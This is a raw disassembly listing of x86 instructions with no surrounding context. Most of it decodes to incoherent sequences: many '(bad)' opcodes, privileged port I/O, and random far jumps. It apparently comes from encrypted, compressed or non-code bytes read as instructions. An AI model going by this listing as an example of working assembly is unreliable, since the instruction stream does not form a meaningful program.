  40fa42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa43:	jle    0x40fa99
  40fa45:	xor    eax,0x3755f891
  40fa4a:	mov    ebx,0xb32bba67
  40fa4f:	loopne 0x40fa0e
  40fa51:	dec    edx
  40fa52:	ror    DWORD PTR [edx-0x5f],cl
  40fa55:	pop    edi
  40fa56:	cmp    ch,dl
  40fa58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa59:	in     al,0x38
  40fa5b:	cmp    eax,0x90161c25
  40fa60:	hlt    
  40fa61:	adc    eax,0xcfd376c6
  40fa66:	jle    0x40fa33
  40fa68:	clc    
  40fa69:	sbb    eax,0xabb547dd
  40fa6e:	push   esi
  40fa6f:	adc    BYTE PTR [ecx],0xc3
  40fa72:	cli    
  40fa73:	loop   0x40fa77
  40fa75:	push   ebx
  40fa76:	push   0xfffffff3
  40fa78:	jae    0x40fa32
  40fa7a:	ja     0x40f9fc
  40fa7c:	push   0x9f6e40d7
  40fa81:	jle    0x40fa51
  40fa83:	dec    ebx
  40fa84:	sub    cl,dl
  40fa86:	sti    
  40fa87:	or     bh,ah
  40fa89:	add    eax,0xfa99c0cb
  40fa8e:	mov    ah,0xb9
  40fa90:	cwde   
  40fa91:	into   
  40fa92:	push   0x0
  40fa94:	in     eax,0x25
  40fa96:	mov    WORD PTR [edi-0x60],?
  40fa99:	xchg   DWORD PTR [esi-0x6e312565],esp
  40fa9f:	dec    eax
  40faa0:	test   BYTE PTR [bp+di+0x1980],0xb
  40faa6:	in     al,0x1b
  40faa8:	(bad)  
  40faaa:	mov    WORD PTR [ebx+0x77],ss
  40faad:	shl    DWORD PTR [ebx],0xb2
  40fab0:	inc    ebx
  40fab1:	repnz in al,dx
  40fab3:	cdq    
  40fab4:	test   DWORD PTR [edi+eax*1],edx
  40fab7:	(bad)  
  40fab8:	std    
  40fab9:	xchg   ecx,eax
  40faba:	push   es
  40fabb:	mov    cs,WORD PTR [edi-0x66]
  40fabe:	add    DWORD PTR [ebx-0xf5f01e0],0xffffffc8
  40fac5:	jae    0x40fa4e
  40fac7:	sahf   
  40fac8:	xchg   esp,eax
  40fac9:	xchg   ebp,eax
  40faca:	(bad)  
  40facb:	in     eax,dx
  40facc:	arpl   WORD PTR [edi+eiz*1-0x523dc725],sp
  40fad3:	sub    al,0xa
  40fad5:	jp     0x40fb18
  40fad7:	popa   
  40fad8:	lock push 0xffffffbf
  40fadb:	sub    esi,DWORD PTR [ecx+0x7]
  40fade:	mov    WORD PTR [esi-0x40a4fc59],cs
  40fae4:	jmp    0x74b81baa
  40fae9:	imul   al
  40faeb:	or     al,0xed
  40faed:	retf   
  40faee:	inc    edi
  40faef:	es iret 
  40faf1:	xor    DWORD PTR [ebx+ecx*1-0x143b45a2],eax
  40faf8:	ja     0x40fa90
  40fafa:	push   ebp
  40fafb:	inc    eax
  40fafc:	loopne 0x40fb68
  40fafe:	xor    BYTE PTR [edi],ah
  40fb00:	sbb    BYTE PTR [ebp+0x1f90c949],bl
  40fb06:	sar    edx,cl
  40fb08:	(bad)  
  40fb09:	fcmovbe st,st(5)
  40fb0b:	and    eax,0x9f875038
  40fb10:	cmp    al,0xf8
  40fb12:	into   
  40fb13:	fldenv [edi*8+0x73154a2]
  40fb1a:	xchg   ebx,eax
  40fb1b:	retf   0x6180
  40fb1e:	test   al,0x2f
  40fb20:	xchg   DWORD PTR [ecx+0x2b],ebx
  40fb23:	pop    ds
  40fb24:	bnd jns 0x40fb8b
  40fb27:	adc    BYTE PTR [edi-0x13],ch
  40fb2a:	in     eax,dx
  40fb2b:	cmp    eax,0x5c078f40
  40fb30:	xor    edi,DWORD PTR [esi+ebp*8]
  40fb33:	fst    DWORD PTR [eax+0x374386f1]
  40fb39:	xchg   esi,eax
  40fb3a:	aaa    
  40fb3b:	add    BYTE PTR ds:0x59ec74d7,bh
  40fb41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb42:	jp     0x40fb84
  40fb44:	or     BYTE PTR [esp+ebp*2+0x6fccee4d],dl
  40fb4b:	push   edi
  40fb4c:	sub    dl,BYTE PTR [ebx+eax*1-0x3b]
  40fb50:	data16 loopne 0x40fb76
  40fb53:	(bad)  
  40fb54:	pop    esp
  40fb55:	dec    esi
  40fb56:	ss icebp 
  40fb58:	mov    ecx,DWORD PTR [eax+0x79ac230e]
  40fb5e:	xchg   ah,bl
  40fb60:	xchg   esi,eax
  40fb61:	add    DWORD PTR [esi],ecx
  40fb63:	(bad)
  40fb66:	xchg   esi,eax
  40fb67:	(bad)  
  40fb68:	mov    bh,BYTE PTR [ecx-0x2f9bb91c]
  40fb6e:	sub    eax,ecx
  40fb70:	push   ebp
  40fb71:	adc    ebp,DWORD PTR [ecx+0x31]
  40fb74:	std    
  40fb75:	add    al,0x62
  40fb77:	ins    DWORD PTR es:[edi],dx
  40fb78:	cmp    ch,BYTE PTR [edx]
  40fb7a:	sbb    BYTE PTR [ebp-0x5f],bl
  40fb7d:	inc    ecx
  40fb7e:	shr    DWORD PTR [ebx-0x43cf08ad],1
  40fb84:	push   ebx
  40fb85:	sbb    ebp,edi
  40fb87:	inc    ecx
  40fb88:	pop    eax
  40fb89:	jl     0x40fbca
  40fb8b:	hlt    
  40fb8c:	fstp   DWORD PTR [esi]
  40fb8e:	add    ebp,DWORD PTR ds:0xaa8dfeec
  40fb94:	cli    
  40fb95:	inc    edx
  40fb96:	stos   DWORD PTR es:[edi],eax
  40fb97:	fs mov dh,0x6c
  40fb9a:	test   DWORD PTR [eax-0x5a],edx
  40fb9d:	rcr    DWORD PTR [edx],cl
  40fb9f:	mov    dl,0x5f
  40fba1:	xor    edi,ecx
  40fba3:	dec    edi
  40fba4:	push   ds
  40fba5:	xchg   BYTE PTR [edx-0x4a],bl
  40fba8:	jae    0x40fbf0
  40fbaa:	ror    BYTE PTR [ecx+0x4],cl
  40fbad:	fwait
  40fbae:	stos   BYTE PTR es:[edi],al
  40fbaf:	jg     0x40fb3b
  40fbb1:	cwde   
  40fbb2:	(bad)  
  40fbb3:	leave  
  40fbb4:	imul   eax,ebp,0xfe73655d
  40fbba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbbb:	sbb    ebp,DWORD PTR [ebx+0x75]
  40fbbe:	xchg   bp,ax
  40fbc0:	xchg   ebx,eax
  40fbc1:	mov    esi,0x2a6102f
  40fbc6:	or     esp,DWORD PTR [ecx]
  40fbc8:	ins    BYTE PTR es:[edi],dx
  40fbc9:	scas   al,BYTE PTR es:[edi]
  40fbca:	mov    esp,0xd91f849d
  40fbcf:	test   BYTE PTR [ebp-0xdbc7c5a],dl
  40fbd5:	push   bp
  40fbd7:	(bad)  
  40fbd9:	scas   al,BYTE PTR es:[edi]
  40fbda:	push   es
  40fbdb:	enter  0x58de,0x1f
  40fbdf:	sar    BYTE PTR [ecx],1
  40fbe1:	ins    DWORD PTR es:[edi],dx
  40fbe2:	mov    ecx,0x74283ba9
  40fbe7:	lahf   
  40fbe8:	mov    ebx,0x8f2b94f9
  40fbed:	push   esi
  40fbee:	sti    
  40fbef:	aad    0x57
  40fbf1:	out    0xce,eax
  40fbf3:	(bad)  
  40fbf4:	jg     0x40fbfa
  40fbf6:	daa    
  40fbf7:	shld   DWORD PTR [edx+0x53cb0334],ebp,0xfd
  40fbff:	add    BYTE PTR [esi+0x907872f],bl
  40fc05:	sub    DWORD PTR [edx+0x118afc01],ebx
  40fc0b:	mov    edi,0xcd4f58f3
  40fc10:	xchg   ebx,eax
  40fc11:	jae    0x40fc51
  40fc13:	jmp    0x4492:0xf9d86cb9
  40fc1a:	dec    ecx
  40fc1b:	sbb    BYTE PTR ds:0xb05f21a6,0xe6
  40fc22:	in     al,0x4
  40fc24:	movq   QWORD PTR [ecx-0x2cc3fe09],mm5
  40fc2b:	push   ecx
  40fc2c:	push   es
  40fc2d:	xchg   ecx,eax
  40fc2e:	jmp    DWORD PTR [ebp+0x4ea39f9f]
  40fc34:	dec    edx
  40fc35:	add    al,0xd0
  40fc37:	test   eax,0x549d5391
  40fc3c:	out    dx,al
  40fc3d:	pop    eax
  40fc3e:	(bad)  
  40fc3f:	pop    ebp
  40fc40:	xchg   al,ch
  40fc42:	ins    BYTE PTR es:[edi],dx
  40fc43:	stos   BYTE PTR es:[edi],al
  40fc44:	shl    DWORD PTR ds:[ecx+eiz*8-0x541e0938],1
  40fc4c:	sbb    DWORD PTR [ecx+edi*4],eax
  40fc4f:	sub    al,0x8
  40fc51:	fimul  DWORD PTR [edi-0x64a30188]
  40fc57:	inc    esp
  40fc58:	dec    edx
  40fc59:	pusha  
  40fc5a:	adc    BYTE PTR [ebx],ch
  40fc5c:	push   edi
  40fc5d:	in     eax,dx
  40fc5e:	push   esi
  40fc5f:	mov    es,ecx
  40fc61:	fdivr  QWORD PTR [ebx-0x7b]
  40fc64:	daa    
  40fc65:	jecxz  0x40fca8
  40fc67:	mov    edx,0xe51c60d8
  40fc6c:	mov    ebx,0x472763e7
  40fc71:	sub    edx,DWORD PTR [ecx+0x61]
  40fc74:	loope  0x40fc6b
  40fc76:	adc    al,0x1b
  40fc78:	adc    eax,0x8888237d
  40fc7d:	ins    BYTE PTR es:[edi],dx
  40fc7e:	test   eax,0xa2d9ee27
  40fc83:	mov    dl,0xab
  40fc85:	mov    al,ds:0xed72908d
  40fc8a:	int3   
  40fc8b:	into   
  40fc8c:	mov    ebx,0x49b301b2
  40fc91:	call   0x3b5b:0x9f6077ad
  40fc98:	in     al,dx
  40fc99:	dec    edi
  40fc9a:	and    DWORD PTR [ecx+0x5e649e8],edx
  40fca0:	dec    ebp
  40fca1:	mov    DWORD PTR [eax],eax
  40fca3:	xchg   edx,eax
  40fca4:	jno    0x40fca7
  40fca6:	jb     0x40fd1e
  40fca8:	mov    ah,0x44
  40fcaa:	clc    
  40fcab:	call   0x323b:0xb7d08c62
  40fcb2:	out    dx,al
  40fcb3:	outs   dx,DWORD PTR ds:[esi]
  40fcb4:	sub    ebp,edx
  40fcb6:	test   eax,esp
  40fcb8:	gs loope 0x40fd27
  40fcbb:	repz jmp 0xc057:0x6ce7cc8f
  40fcc3:	sub    DWORD PTR [ebx],0xe727a1ba
  40fcc9:	and    al,0x67
  40fccb:	xor    BYTE PTR [ebx+0x3f10366],bl
  40fcd1:	shr    ecx,0xca
  40fcd4:	add    al,BYTE PTR [eax]
  40fcd6:	add    al,dh
  40fcd8:	sub    DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	shl    DWORD PTR [esi],0x44
  40fce5:	stos   DWORD PTR es:[edi],eax
  40fce6:	push   0xffffffb9
  40fce8:	mov    bl,0x7e
  40fcea:	jle    0x40fc98
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fd04
  40fcf0:	repnz or al,0x3
  40fcf3:	out    dx,eax
  40fcf4:	cmp    esi,DWORD PTR [eax-0x461bf667]
  40fcfa:	push   ss
  40fcfb:	dec    ebx
  40fcfc:	jmp    0xae59:0x57bb8a83
  40fd03:	jecxz  0x40fc92
  40fd05:	and    esp,DWORD PTR [edi-0xd]
  40fd08:	mov    ah,0x64
  40fd0a:	mov    ch,0x25
  40fd0c:	mov    edi,0xe38a05c2
  40fd11:	loopne 0x40fd32
  40fd13:	mov    ah,0x94
  40fd15:	or     bl,dh
  40fd17:	sahf   
  40fd18:	mov    DWORD PTR [esi+edx*2-0x57],eax
  40fd1c:	fwait
  40fd1d:	adc    DWORD PTR [ebx],edi
  40fd1f:	adc    al,0x5c
  40fd21:	jmp    0xfd530e24
  40fd26:	aam    0xd1
  40fd28:	sbb    ah,BYTE PTR [ebp-0x7cceb334]
  40fd2e:	add    ah,bl
  40fd30:	or     BYTE PTR [ecx],cl
  40fd32:	lods   al,BYTE PTR ds:[esi]
  40fd33:	jns    0x40fcfb
  40fd35:	pavgw  mm3,mm2
  40fd38:	cmp    eax,edi
  40fd3a:	int3   
  40fd3b:	clc    
  40fd3c:	ss pop esi
  40fd3e:	mov    edx,0x5adebd1a
  40fd43:	and    ebp,ebp
  40fd45:	jmp    0x2b5f:0x6e50cd34
  40fd4c:	ret    
  40fd4d:	pop    edx
  40fd4e:	jmp    0xba67130
  40fd53:	mov    DWORD PTR [eax-0x80],ecx
  40fd56:	nop
  40fd57:	cwde   
  40fd58:	fs ret 0x5839
  40fd5c:	xchg   ebp,esp
  40fd5e:	pusha  
  40fd5f:	pop    ebp
  40fd60:	in     eax,dx
  40fd61:	aas    
  40fd62:	dec    BYTE PTR [esi+0x41c332e8]
  40fd68:	shl    ebp,cl
  40fd6a:	mov    al,ds:0xf714358f
  40fd6f:	xor    DWORD PTR [ecx+eax*4-0x533ca2ff],ebp
  40fd76:	mov    cl,0x2f
  40fd78:	jg     0x40fdef
  40fd7a:	imul   ebp,DWORD PTR [eax],0x4a7368ec
  40fd80:	mov    esp,0x8c9e36ae
  40fd85:	das    
  40fd86:	dec    ebx
  40fd87:	sub    eax,0x85f74f14
  40fd8c:	xor    al,0xab
  40fd8e:	cs hlt 
  40fd90:	sub    edx,DWORD PTR [edi]
  40fd92:	jg     0x40fdce
  40fd94:	add    bh,BYTE PTR [edi]
  40fd96:	sbb    cl,BYTE PTR [edi+0x51415648]
  40fd9c:	cmc    
  40fd9d:	or     al,0x15
  40fd9f:	push   ebp
  40fda0:	scas   al,BYTE PTR es:[edi]
  40fda1:	mov    eax,0x34b83012
  40fda6:	(bad)  [eax]
  40fda8:	mov    dl,0xa6
  40fdaa:	fwait
  40fdab:	(bad)  
  40fdac:	fs pop ebx
  40fdae:	add    DWORD PTR [eax],0xd629d987
  40fdb4:	les    edi,FWORD PTR [eax-0x5a]
  40fdb7:	inc    edx
  40fdb8:	daa    
  40fdb9:	outs   dx,DWORD PTR ds:[esi]
  40fdba:	mov    esi,0x8eabdf8
  40fdbf:	call   FWORD PTR [ecx]
  40fdc1:	call   0xa02b:0x2ee21978
  40fdc8:	sub    eax,0xb983e8fb
  40fdcd:	and    bl,BYTE PTR [ebx+0x7a]
  40fdd0:	stos   DWORD PTR es:[edi],eax
  40fdd1:	popf   
  40fdd2:	ins    DWORD PTR es:[edi],dx
  40fdd3:	in     eax,dx
  40fdd4:	inc    esp
  40fdd5:	in     al,dx
  40fdd6:	sti    
  40fdd7:	dec    esi
  40fdd8:	push   0x49
  40fdda:	aaa    
  40fddb:	je     0x40fe45
  40fddd:	xchg   esi,eax
  40fdde:	mov    dh,0x29
  40fde0:	add    eax,ebx
  40fde2:	mov    dh,0x74
  40fde4:	pop    esp
  40fde5:	inc    esi
  40fde6:	sub    ecx,0x3c
  40fde9:	mov    esp,esi
  40fdeb:	repz sti 
  40fded:	push   edx
  40fdee:	daa    
  40fdef:	sbb    ebx,DWORD PTR [eax]
  40fdf1:	mov    cl,0x98
  40fdf3:	inc    edx
  40fdf4:	push   eax
  40fdf5:	dec    ebx
  40fdf6:	pop    ss
  40fdf7:	sbb    DWORD PTR [esi+0x3bba1643],ebp
  40fdfd:	daa    
  40fdfe:	lods   al,BYTE PTR ds:[esi]
  40fdff:	hlt    
  40fe00:	enter  0xfc0c,0x3b
  40fe04:	xor    bl,BYTE PTR [ecx]
  40fe06:	mov    DWORD PTR [ecx+eax*8],esp
  40fe09:	inc    eax
  40fe0a:	sbb    esi,DWORD PTR [ecx+edx*4-0x2]
  40fe0e:	xchg   ecx,eax
  40fe0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe10:	inc    esi
  40fe11:	add    al,0x62
  40fe13:	loopne 0x40fdd0
  40fe15:	pop    edx
  40fe16:	into   
  40fe17:	ja     0x40fdb6
  40fe19:	mov    bl,0x65
  40fe1b:	div    BYTE PTR [edi]
  40fe1d:	mul    DWORD PTR [edi]
  40fe1f:	aaa    
  40fe20:	inc    edx
  40fe21:	push   esi
  40fe22:	aad    0x4
  40fe24:	or     BYTE PTR [esi+0x3d77e0e6],0xef
  40fe2b:	jl     0x40fdcf
  40fe2d:	shr    BYTE PTR [ecx-0x20],1
  40fe30:	fdiv   DWORD PTR [ecx+edi*2]
  40fe33:	test   BYTE PTR [edx],al
  40fe35:	aad    0xb2
  40fe37:	test   al,0xd1
  40fe39:	fld    QWORD PTR ds:0x3064bcb4
  40fe3f:	jae    0x40fdf5
  40fe41:	mov    edi,ebx
  40fe43:	loope  0x40fea4
  40fe45:	inc    esp
  40fe46:	pop    es
  40fe47:	sbb    bl,BYTE PTR [edi-0x13ed2b10]
  40fe4d:	cdq    
  40fe4e:	scas   al,BYTE PTR es:[edi]
  40fe4f:	pop    eax
  40fe50:	inc    edx
  40fe51:	icebp  
  40fe52:	fwait
  40fe53:	outs   dx,BYTE PTR ds:[esi]
  40fe54:	mov    DWORD PTR [ecx],ecx
  40fe56:	sub    al,0xd1
  40fe58:	push   esi
  40fe59:	jnp    0x40fe4d
  40fe5b:	aaa    
  40fe5c:	popf   
  40fe5d:	int    0x97
  40fe5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe60:	mov    dh,0x68
  40fe62:	jnp    0x40fee2
  40fe64:	push   0x67
  40fe66:	scas   eax,DWORD PTR es:[edi]
  40fe67:	sub    BYTE PTR [edx-0xe083ee1],0x66
  40fe6e:	ja     0x40fed4
  40fe70:	out    0x58,eax
  40fe72:	ds or  eax,0x7369d259
  40fe78:	sub    al,0xca
  40fe7a:	jno    0x40fe67
  40fe7c:	retf   0x8613
  40fe7f:	dec    BYTE PTR [edx+0x22f1554a]
  40fe85:	xor    cl,BYTE PTR [ecx]
  40fe87:	test   BYTE PTR [esi+0x32a8aa1d],bh
  40fe8d:	je     0x40fed7
  40fe8f:	mov    ah,dl
  40fe91:	ret    
  40fe92:	mov    eax,ds:0xadc8c36
  40fe97:	addr16 inc eax
  40fe99:	sub    BYTE PTR [edi-0x52],cl
  40fe9c:	mov    gs,WORD PTR [eax-0x69dfa58e]
  40fea2:	lock add al,0xe5
  40fea5:	(bad)  
  40fea6:	mov    ch,0xeb
  40fea8:	ins    BYTE PTR es:[edi],dx
  40fea9:	inc    eax
  40feaa:	fnstcw WORD PTR [esi]
  40feac:	jmp    0x40feda
  40feae:	not    DWORD PTR [edi]
  40feb0:	mov    al,ds:0x7a4de624
  40feb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feb6:	ror    dh,0xef
  40feb9:	xchg   edx,eax
  40febb:	rcl    BYTE PTR cs:[ebx],cl
  40febe:	(bad)  
  40febf:	pop    ds
  40fec0:	dec    edi
  40fec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fec2:	in     eax,0xa7
  40fec4:	popa   
  40fec5:	inc    eax
  40fec6:	loop   0x40ff19
  40fec8:	jno    0x40fe7b
  40feca:	dec    esi
  40fecb:	mov    esp,0xbb9b3a01
  40fed0:	repz and al,0xd
  40fed3:	cmp    esi,DWORD PTR ds:0x1a44d577
  40fed9:	retf   0x7a0c
  40fedc:	lods   al,BYTE PTR ds:[esi]
  40fedd:	cs push ebp
  40fedf:	stos   DWORD PTR es:[edi],eax
  40fee0:	test   eax,0x446f8eb4
  40fee6:	test   dh,ch
  40fee8:	mov    edi,DWORD PTR [edx-0x66]
  40feeb:	jmp    0x40fea4
  40feed:	stc    
  40feee:	cld    
  40feef:	adc    BYTE PTR [ebx+0x67],al
  40fef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef3:	gs jnp 0x40ff66
  40fef6:	push   esi
  40fef7:	lock and eax,0xba2bb94d
  40fefd:	pop    ebp
  40fefe:	les    ebx,FWORD PTR [eax+edi*4+0x32]
  40ff02:	out    0xcf,eax
  40ff04:	xlat   BYTE PTR ds:[ebx]
  40ff05:	push   edi
  40ff06:	fcom   DWORD PTR [eax+0x4692b085]
  40ff0c:	and    DWORD PTR [ebx-0x1f],ebp
  40ff0f:	adc    edi,eax
  40ff11:	inc    ebx
  40ff12:	int3   
  40ff13:	sbb    BYTE PTR [edx+eiz*1-0x7d],bl
  40ff17:	jle    0x40ff75
  40ff19:	aas    
  40ff1a:	aad    0xf
  40ff1c:	daa    
  40ff1d:	outs   dx,BYTE PTR ds:[esi]
  40ff1e:	mov    dl,0x13
  40ff20:	mov    WORD PTR [edx-0x67],gs
  40ff23:	mov    dh,0x67
  40ff25:	fbstp  TBYTE PTR [edx]
  40ff27:	aam    0x8b
  40ff29:	in     eax,dx
  40ff2a:	or     edx,DWORD PTR [eax-0x3e]
  40ff2d:	and    al,0x6b
  40ff2f:	sbb    BYTE PTR [ebx-0x17],cl
  40ff32:	dec    eax
  40ff33:	and    al,0x87
  40ff35:	mov    eax,ds:0x1874bfc
  40ff3a:	popa   
  40ff3b:	pop    edx
  40ff3c:	push   es
  40ff3d:	push   edx
  40ff3e:	xchg   ebp,eax
  40ff3f:	xchg   BYTE PTR [esi-0x3d1fa711],dl
  40ff45:	xchg   BYTE PTR [edi+0x4bb01d5a],dl
  40ff4b:	push   ebp
  40ff4c:	sti    
  40ff4d:	repnz or al,0xcd
  40ff50:	into   
  40ff51:	rcr    BYTE PTR [ecx-0x515ee4d2],0xa1
  40ff58:	dec    ecx
  40ff59:	and    eax,0x88db6f9b
  40ff5e:	cmp    ah,dl
  40ff60:	cmp    cl,bl
  40ff62:	shl    BYTE PTR [eax+eax*1+0x1d5181f5],1
  40ff69:	xor    bl,BYTE PTR [ecx]
  40ff6b:	addr16 jnp 0x40ffd6
  40ff6e:	daa    
  40ff6f:	popa   
  40ff70:	fld    DWORD PTR [ecx+0x642eb121]
  40ff76:	mov    esi,0x6c4e6fed
  40ff7b:	dec    esi
  40ff7c:	bound  esi,QWORD PTR [eax-0x5f5a3238]
  40ff82:	in     al,dx
  40ff83:	pushf  
  40ff84:	and    ch,ah
  40ff86:	aaa    
  40ff87:	mov    ecx,0x320efc86
  40ff8c:	sub    BYTE PTR [ebp+0x6141b722],dl
  40ff92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff93:	leave  
  40ff94:	mov    bl,0x38
  40ff96:	cld    
  40ff97:	pop    edi
  40ff98:	push   0x38cb3518
  40ff9d:	jmp    0xc6af:0xfb568ef
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433723,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4337e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0x29d739b1
  40ffd9:	and    DWORD PTR ds:0x7e7ebef7,esp
  40ffdf:	lods   al,BYTE PTR ds:[esi]
  40ffe0:	jl     0x410060
  40ffe2:	jle    0x40ffee
  40ffe4:	pop    ds
  40ffe5:	pop    ss
  40ffe6:	cmp    ch,dh
  40ffe8:	cld    
  40ffe9:	fwait
  40ffea:	sbb    DWORD PTR [edx-0x54],0xe227ad98
  40fff1:	mov    BYTE PTR [ecx-0x2c],0xea
  40fff5:	punpckhdq mm6,QWORD PTR fs:[ebx+0x7ab70a38]
  40fffd:	jp     0x41003d
  40ffff:	add    ebp,DWORD PTR [ebp+0x6]
  410002:	in     eax,0xfe
  410004:	push   ds
  410005:	shr    DWORD PTR [edx],cl
  410007:	retf   0x2214
  41000a:	je     0x41006a
  41000c:	lods   eax,DWORD PTR ds:[esi]
  41000d:	test   BYTE PTR [ebp+0x1e],ch
  410010:	jb     0x40ffe2
  410012:	sbb    esp,0x4a25bca3
  410018:	pop    es
  410019:	daa    
  41001a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41001b:	push   cs
  41001c:	retf   
  41001d:	mov    ds:0xf60572a3,al
  410022:	js     0x41000e
  410024:	add    edx,edx
  410026:	add    ebp,DWORD PTR [eax+0x22d1fca]
  41002c:	xchg   esp,eax
  41002d:	test   eax,0x85b981a8
  410032:	push   ebp
  410033:	mov    esp,0xdd735e82
  410038:	sub    ebp,DWORD PTR [esp+ebx*2+0x35]
  41003c:	or     BYTE PTR [esi+0x645a5eee],dl
  410042:	imul   esi,DWORD PTR [edx-0x42],0xfb58b0fc
  410049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41004a:	pusha  
  41004b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41004c:	pop    ss
  41004d:	call   0xd9ab49d4
  410052:	sti    
  410053:	inc    ebp
  410054:	lahf   
  410055:	or     edx,DWORD PTR [esi]
  410057:	loopne 0x40ffec
  410059:	cmp    al,0xe8
  41005b:	mov    edx,0x19421c40
  410060:	ficom  WORD PTR [ecx]
  410062:	mov    dl,0xe9
  410064:	cli    
  410065:	iret   
  410066:	push   esp
  410067:	pop    ds
  410068:	out    dx,al
  410069:	fcmovnb st,st(6)
  41006b:	push   ds
  41006c:	adc    ah,dl
  41006e:	test   DWORD PTR [ecx+0x1d],ecx
  410071:	xor    ah,BYTE PTR [esi-0x58]
  410074:	bound  edi,QWORD PTR [eax-0x1b]
  410077:	ja     0x41002d
  410079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41007a:	shl    DWORD PTR [ecx+esi*1],cl
  41007d:	push   eax
  41007e:	test   al,0x15
  410080:	xor    edi,DWORD PTR [ecx-0x1c]
  410083:	xor    bh,ch
  410085:	sbb    BYTE PTR [edi+0x31],ch
  410088:	out    0x33,al
  41008a:	out    dx,eax
  41008b:	ret    0x28e7
  41008e:	add    DWORD PTR [edx+0x4ce36395],esi
  410094:	mov    ds:0xf2d06c4a,al
  410099:	hlt    
  41009a:	into   
  41009b:	mov    eax,0xd061447f
  4100a0:	cdq    
  4100a1:	imul   edi,DWORD PTR [esi],0x5b99546f
  4100a7:	sub    BYTE PTR [eax],bl
  4100a9:	push   ebp
  4100aa:	fwait
  4100ab:	mov    dh,0x56
  4100ad:	out    dx,al
  4100ae:	cld    
  4100af:	shl    DWORD PTR [esi-0x59ac7f52],0xf4
  4100b6:	leave  
  4100b7:	ins    DWORD PTR es:[edi],dx
  4100b8:	and    eax,0x7ae8f946
  4100bd:	(bad)  
  4100be:	adc    DWORD PTR [bx+di-0x78],ebx
  4100c2:	stos   DWORD PTR es:[edi],eax
  4100c3:	jne    0x4100e7
  4100c5:	hlt    
  4100c6:	xchg   esi,eax
  4100c7:	and    BYTE PTR [ecx],0x96
  4100ca:	mov    ebx,0xb76d7e75
  4100cf:	ret    0x7111
  4100d2:	pop    edi
  4100d3:	les    ecx,FWORD PTR [ebx-0x5c]
  4100d6:	jge    0x41014f
  4100d8:	inc    ebx
  4100d9:	pop    edi
  4100da:	sub    al,0x63
  4100dc:	imul   ebx,DWORD PTR [esi+eax*2-0x3f823e2a],0x1a17d408
  4100e7:	mov    bh,0x86
  4100e9:	add    cl,BYTE PTR [eax-0x2f]
  4100ec:	cwde   
  4100ed:	lods   eax,DWORD PTR ds:[esi]
  4100ee:	(bad)  
  4100ef:	jb     0x41012c
  4100f1:	and    al,0xd6
  4100f3:	mov    WORD PTR [ebx+0x3575eb47],ss
  4100f9:	call   0xc537:0x29969026
  410100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410101:	into   
  410102:	ss (bad) 
  410104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410105:	pop    esi
  410106:	test   WORD PTR [ebp+0x0],0x85f5
  41010c:	jecxz  0x41016c
  41010e:	addr16 fcom st(5)
  410111:	outs   dx,DWORD PTR ds:[esi]
  410113:	sbb    eax,0x2731da57
  410118:	add    DWORD PTR [edx],esi
  41011a:	(bad)  [eax+0x1479bc74]
  410120:	sbb    cl,cl
  410122:	jae    0x41013f
  410124:	arpl   WORD PTR [ecx+0x36],dx
  410127:	sbb    eax,0xc8faab3f
  41012c:	lock (bad) 
  41012e:	mov    eax,ds:0xb7e6c34e
  410133:	js     0x4101a5
  410135:	enter  0x88e6,0xae
  410139:	lea    ebx,[esi-0xe]
  41013c:	inc    edx
  41013d:	(bad)  
  41013e:	push   cs
  41013f:	pop    ebx
  410140:	add    DWORD PTR [esi],edx
  410142:	push   es
  410143:	je     0x410199
  410145:	dec    edi
  410146:	stos   BYTE PTR es:[edi],al
  410147:	in     al,dx
  410148:	xchg   esi,eax
  410149:	fs dec esp
  41014b:	push   edx
  41014c:	sub    ecx,DWORD PTR [esi]
  41014e:	pop    esi
  41014f:	popf   
  410150:	jmp    0xef0791e8
  410155:	xchg   BYTE PTR [esi+0x32676eb9],bl
  41015b:	fwait
  41015c:	pop    eax
  41015d:	add    al,0x82
  41015f:	cmc    
  410160:	push   edx
  410161:	mov    ecx,0xc549d6ff
  410166:	aad    0x47
  410168:	fadd   st(2),st
  41016a:	(bad)  
  41016b:	(bad)  
  41016c:	add    bl,BYTE PTR [ebx-0x62ad5a9]
  410172:	aaa    
  410173:	mov    esi,0x822f6720
  410178:	int    0xcb
  41017a:	mov    al,0x8d
  41017c:	jmp    0x8484:0xf9413a0e
  410183:	mov    ch,0xf5
  410185:	out    0x73,eax
  410187:	inc    ebx
  410188:	fs push ds
  41018a:	and    eax,0xb8adae29
  41018f:	icebp  
  410190:	mov    DWORD PTR [edi+esi*8],esp
  410193:	jmp    DWORD PTR [edx]
  410195:	sbb    ch,al
  410197:	fdiv   DWORD PTR [edi+0x7d]
  41019a:	and    al,0x35
  41019c:	repz push es
  41019e:	dec    ecx
  41019f:	and    eax,0x6fee1271
  4101a4:	sti    
  4101a5:	repnz or BYTE PTR [ecx+0x2d],al
